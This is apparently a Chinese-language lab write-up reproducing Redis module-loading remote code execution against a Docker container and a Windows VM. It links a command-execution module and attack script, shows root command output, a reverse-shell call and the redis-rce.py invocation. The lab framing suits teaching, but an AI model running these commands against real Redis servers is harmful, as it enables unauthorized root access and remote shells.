1\. Redis modules 介绍

![](../Images/db164a2ab45bae3a85fa59d63c81e977.png)

Redis外部模块是用来扩展 Redis功能的，我们可以实现一个与Redis原生命令速度和特性类似的命令在Redis内核中。Redis modules 实际是一个动态库，它能够让Redis-cli 使用 MODULE LOAD 命令去把它加载到Redis内核。Redis module 使用 C 的API实现的，相应的函数在redismodule.h头文件中，这也叫意味着RedisModule 必须使用 c 或者c++这种去实现它。

Redis模块使使用外部模块扩展Redis功能成为可能，以较快的速度实现新的Redis命令，并具有与核心本身类似的功能.

但是加载模块的功能在redis 4.x 5.x才能使用，低版本无法加载扩展。

## 2\. 加载模块有两种方法

*   **方法1** 在redis.conf 中增加 loadmodule /path/to/mymodule.so
    

*   **方法2** 使用MODULE LOAD /path/mymodule.so 命令去加载。
    

**制作moudles（有制作好的，复现可以直接使用现成的）**

*https://github.com/RicterZ/RedisModules-ExecuteCommand*

这里作者已经做好了可以命令执行的modules，可以通过redis-cli来执行命令：

```
127.0.0.1:6379&gt; system.exec "id"

"uid=0(root) gid=0(root) groups=0(root)\\\\n"

127.0.0.1:6379&gt; system.exec "whoami"

"root\\\\n"

127.0.0.1:6379&gt; system.rev 127.0.0.1 9999
```

**攻击脚本**

*https://github.com/Ridter/redis-rce*

需要提供的参数有 目标host和本机host，如果不是默认端口需要提供端口。这里使用默认端口即可。使用方法可以查看readme

## 3\. 在Linux上进行实验

思路是用docker生成一个redis环境，来模拟被攻击机器，用攻击脚本去攻击docker。

首先使用docker pull一个redis的镜像下来。

```
docker pull redis:4.0.14
```

然后启动容器

```
docker run \-p 6379:6379 \-v \\$PWD/data:/data \-d redis:4.0.14 redis-server –appendonly yes
```

*   \-p：端口映射，左边是外部的端口，右边是docker内部的端口，左边之前可以加上ip，具体的参数可以百度
    

这里可以使用netstat -ntlp来查看开放的端口

![](../Images/0eadd4108222a4097bd408ca53c5cdd7.png)

6379端口开放，注意，这里不能是127.0.0.1:6379（第一次我在docker run 的时候用了127.0.0.1，这就只能本地访问，需要 0.0.0.0 才可以外部访问，至于为什么是全是冒号，我也不知道，也不敢问）  

然后使用docker ps查看一下容器的状态

![](../Images/91df7476ba176ae97a337081ff19660b.png)

```
docker exec \-it 4781ea bash

```

其中4718ea是容器的 id，这个不用输全，输入前几位就可以了，这个的意思是执行容器的bash，可以用来查看docker的内部ip，使用 `cat /etc/hosts`可以看到docker内部的ip。

同样

```
docker exec \-it 4781ea redis-cli
```

![](../Images/9a14cb720f0661a496e7058c830e9271.png)

就是执行docker里卖弄的redis-cli.可以看到成功执行。  

（想要退出的话用exit）

然后就是使用攻击脚本了，这里docker端口映射的也是默认的端口，所以不用-p和-P参数，直接默认就行。

```
python redis-rce.py \-r 172.18.0.2 \-L 172.18.0.1 \-f exp\\\_lin.so
```

![](../Images/4541297edc182e6465aca7c5e52815c6.png)

进入docker的bash。（执行docker操作）  

```
docker exec \-it docker\\\_name bash
```

*   \-r：目标IP
    
*   \-L：本机的IP
    
*   \-f：payload
    

```
python redis-rce.py \-r 172.18.0.2 \-L 172.18.0.1 \-f exp\\\_lin.so
```

## 4\. 攻击Windows的尝试

思路是有一台使用redis的Windows机器，现在我们使用虚拟机来模拟一次攻击

首先在Windows中安装redis，在这里可以找到大佬们制作的版本。（埋下伏笔）

*https://github.com/microsoftarchive/redis/releases*

下载下来后可以直接使用

```
redis-server redis.windows.conf
```

执行，成功执行。

![](../Images/5770084fd345e940b3cb7b3d0154a09c.png)

由于Windows存在防火墙，首先得放行6379端口。方法可以百度，简单说就是在防火墙入站规则里加上6379端口可以访问就行。  

这时候可以查看一下本机端口情况

```
netstat \-na | findstr 6379
```

发现在 127.0.0.1 上开放的 6379，所以虚拟机无法访问。

更改 conf 文件，把 bind 注释掉，端口开放到 0.0.0.0，可以通过虚拟机访问。

![](../Images/a2172c23638842c755b1a8c810961df5.png)

之后有一些报错，在conf文件里面取消安全模式即可。  

```
protected-mode no
```

之后在虚拟机里面执行攻击脚本。发现报错moudle问题，应该是Windows的redis版本低没有加载扩展功能。或者是这个payload不适合Windows。

![](../Images/c6a7ab6477d1cb17695a151f27a6fac8.png)

![](../Images/013425601e34fa5efcaedf0bd79c5d66.png)
